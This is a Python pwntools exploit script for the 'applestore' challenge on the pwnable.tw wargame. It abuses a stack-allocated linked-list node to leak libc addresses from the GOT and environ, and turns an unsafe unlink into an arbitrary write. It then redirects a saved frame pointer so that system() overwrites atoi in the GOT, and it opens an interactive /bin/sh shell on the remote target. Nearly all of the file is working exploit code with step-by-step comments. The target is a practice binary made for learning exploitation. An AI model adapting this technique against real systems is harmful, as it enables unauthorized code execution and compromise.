from pwn import *
from enum import Enum
from rich.progress import track

import construct
import argparse
import time

AppleDevice = construct.Struct(
    "name_ptr" / construct.Hex(construct.Int32ul),
    "price" / construct.Int32ul,
    "next" / construct.Hex(construct.Int32ul),
    "prev" / construct.Hex(construct.Int32ul),
)


class Menu(Enum):
    ListDevicesInStore = 1
    AddDeviceToCart = 2
    DeleteDeviceFromCart = 3
    ListShoppingCart = 4
    Checkout = 5


def choose_menu(p, menu: Menu):
    p.sendafter(b"> ", str(menu.value).encode())


def create_device_struct(**kwargs):
    return AppleDevice.build(kwargs)


def add_dev_to_cart(p: process, dev_num: int):
    choose_menu(p, Menu.AddDeviceToCart)
    p.sendafter(b"Device Number> ", str(dev_num).encode())


def checkout(p: process):
    # checkout, this will add a stack-allocated device to the list
    choose_menu(p, Menu.Checkout)

    p.sendafter(b"Let me check your cart. ok? (y/n) > ", b"y")
    data = p.recvuntil(b"Total: ")
    if b"iPhone 8" in data:
        info("Got the stack allocated iPhone 8 for 1$")
    else:
        error("Failed triggering creation of iPhone 8 device on the stack")


def arbitrary_read(p: process, addr: int):
    choose_menu(p, Menu.ListShoppingCart)

    # cart()'s buffer is located at EBP-0x22, and checkout()'s declared the device on the stack at EBP - 0x20.
    # therefore we can write y, then another y to fill the padding, then the rest of the data will overwrite the iPhone 8 device struct.
    p.sendafter(
        b"Let me check your cart. ok? (y/n) > ",
        b"yy" + create_device_struct(name_ptr=addr, price=0, next=0, prev=0),
    )
    p.recvuntil(b"27: ", drop=True)
    return u32(p.recv(4))


def delete_dev_from_cart(p: process, payload: bytes):
    """
    This is our write primitive.
    The delete action does pointer updates in order to remove the device from the linked list:

    if (index == num) {
      next = dev->next;
      prev = dev->prev;
      if (prev != (apple_dev *)0x0) {
        prev->next = next;
      }
      if (next != (apple_dev *)0x0) {
        next->prev = prev;
      }

      printf("Remove %d:%s from your shopping cart.\n",index,dev->name_ptr);
    }

    ------------------------------------------------------------------------------

    As we can see, in order to exploit this into a write primitive, we can adjust:
        1. dev->name_ptr to be any pointer to a readable string.
        2. next to the address we want to write to minus 0xc, since the write to next->prev is done like this:
           08048a2a 89 50 0c      MOV       dword ptr [num + 0xc],EDX ; EDX equal dev->prev
        3. prev to the value we want to write at the designated address.

    Becuase there are writes to both prev->next (prev + 0x8) and next->prev (next + 0xc), both values of next and prev
    needs to be writeable. Therefore we can not directly overwrite atoi's GOT entry with system(), because system address
    will not be writeable.

    However, we can exploit this to overwrite delete()'s saved EBP such that the next call to my_read() in
    handler() will actually read into the atoi entry in the GOT.
    """
    choose_menu(p, Menu.DeleteDeviceFromCart)
    p.sendafter(b"Item Number> ", payload)


def trigger_iphone8_stack_allocated_dev_creation(p: process):
    for _ in track(range(10), description="Adding 10 iPad Mini 3 devices"):
        add_dev_to_cart(p, 4)

    for _ in track(range(16), description="Adding 16 iPod Touch devices"):
        add_dev_to_cart(p, 5)

    checkout(p)


def write_uint(p: process, at: int, what: int):
    # Both `at` and `what` must be writeable addresses.

    if what & 0xFFFFFFFF != what:
        error("write_uint: can only write 4 bytes")

    delete_dev_from_cart(
        p,
        b"27"
        + create_device_struct(
            name_ptr=0x8048F88,
            price=0,
            next=at - 12,
            prev=what,
        ),
    )


def exploit(args):
    info(f"Exploit target: {args.host} {args.port}")
    with context.quiet:
        elf = ELF("./applestore")
        if args.local:
            p = process("./applestore")
            libc = ELF("/lib/i386-linux-gnu/libc.so.6")
            # gdb.attach(p, "b *0x0804899a")
            DELETE_SAVED_EBP_OFFSET_FROM_ENVIRON = -292
        else:
            p = remote(args.host, args.port)
            libc = ELF("./libc_32.so.6")
            DELETE_SAVED_EBP_OFFSET_FROM_ENVIRON = -260

    t1 = time.time()
    trigger_iphone8_stack_allocated_dev_creation(p)

    info("Leaking libc puts address from the GOT...")
    puts_addr = arbitrary_read(p, elf.got["puts"])
    info(f"Leaked puts address: {puts_addr:#x}")

    libc.address = puts_addr - libc.sym["puts"]
    info(f"Calculated libc base: {libc.address:#x}")
    info("Reading environ to get the pointer to the env on the stack...")
    environ_stack = arbitrary_read(p, libc.sym["environ"])
    system_addr = libc.sym["system"]
    delete_saved_ebp_addr = environ_stack + DELETE_SAVED_EBP_OFFSET_FROM_ENVIRON

    info("Calculating addresses needed for the exploit...")
    info(f"Calculated system() address: {system_addr:#x}")
    info(f"Calculated delete's saved EBP addr: {delete_saved_ebp_addr:#x}")

    """
    overwrite handler's EBP (delete's saved EBP), such that when it returns,
    handler's EBP now points to atoi@GOT + 0x22, therefore the next call to my_read() in handler:
    
    08048c05 8d 45 de      LEA       EAX=>buffer,[EBP + -0x22]
    08048c08 89 04 24      MOV       dword ptr [ESP]=>local_3c,EAX
    08048c0b e8 89 fb      CALL      my_read
             ff ff
    
    Actually reads from stdin directly into EBP-0x22 which equals atoi@GOT+0x22-0x22=atoi@GOT!
    """

    info("Overwriting delete's saved EBP [handler's EBP] with atoi@GOT + 0x22")
    write_uint(p, delete_saved_ebp_addr, elf.got["atoi"] + 0x22)

    # overwrite atoi@GOT and call atoi() on the input
    info("Writing system() address into atoi GOT entry and triggering system(/bin/sh)")
    p.sendafter(b"> ", p32(system_addr) + b";/bin/sh")
    p.recvuntil(b"not found\n", drop=True)
    t2 = time.time()
    took = t2 - t1
    info(f"Exploit succeeded in {took:.3f} seconds")
    p.interactive()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--host", type=str, default="chall.pwnable.tw")
    parser.add_argument("--port", type=int, default=10104)
    args = parser.parse_args()

    exploit(args)
